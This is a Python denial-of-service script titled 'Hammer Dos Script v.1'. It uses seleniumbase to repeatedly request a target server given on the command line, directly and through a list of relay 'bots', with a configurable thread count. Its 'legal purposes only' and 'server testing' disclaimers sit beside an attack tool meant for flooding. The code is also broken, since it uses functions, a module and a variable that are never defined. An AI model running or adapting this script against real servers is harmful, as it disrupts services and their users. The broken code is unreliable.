#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Python 3.3.2+ Hammer Dos Script v.1
# by Scav-engeR
# Only for legal purposes

import sys
import time
import threading
import random
from queue import Queue
from optparse import OptionParser
from seleniumbase import BaseCase

class MyTest(BaseCase):
    def dos(self):
        while True:
            self.driver.get(f"http://{host}")
            print("\033[92m", time.ctime(time.time()), "\033[0m \033[94m <--packet sent! hammering--> \033[0m")
            time.sleep(0.1)

    def dos2(self):
        while True:
            self.driver.get(random.choice(bots) + f"http://{host}")
            print("\033[94mbot is hammering...\033[0m")
            time.sleep(0.1)

def usage():
    print(''' \033[92m Hammer Dos Script v.1 http://www.canyalcin.com/
    It is the end user's responsibility to obey all applicable laws.
    It is just for server testing script. Your IP is visible. \n
    Usage : python3 hammer.py [-s] [-p] [-t]
    -h : Help
    -s : Server IP
    -p : Port (default 80)
    -t : Turbo (default 135) \033[0m''')
    sys.exit()

def get_parameters():
    global host
    global port
    global thr
    global item
    optp = OptionParser(add_help_option=False, epilog="Hammers")
    optp.add_option("-q", "--quiet", help="Set logging to ERROR", action="store_const", dest="loglevel", const=logging.ERROR, default=logging.INFO)
    optp.add_option("-s", "--server", dest="host", help="Attack to server IP -s IP")
    optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 (default 80)")
    optp.add_option("-t", "--turbo", type="int", dest="turbo", help="Default 135 -t 135")
    optp.add_option("-h", "--help", dest="help", action='store_true', help="Help menu")
    opts, args = optp.parse_args()
    logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')
    if opts.help:
        usage()
    if opts.host is not None:
        host = opts.host
    else:
        usage()
    if opts.port is None:
        port = 80
    else:
        port = opts.port
    if opts.turbo is None:
        thr = 135
    else:
        thr = opts.turbo

# Reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()

# Task queue are q, w
q = Queue()
w = Queue()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
    get_parameters()
    print("\033[92m", host, " port: ", str(port), " turbo: ", str(thr), "\033[0m")
    print("\033[94mPlease wait...\033[0m")
    user_agent()
    my_bots()
    time.sleep(5)
    try:
        with MyTest() as test:
            test.dos()
            test.dos2()
    except Exception as e:
        print("\033[91mCheck server IP and port\033[0m")
        usage()
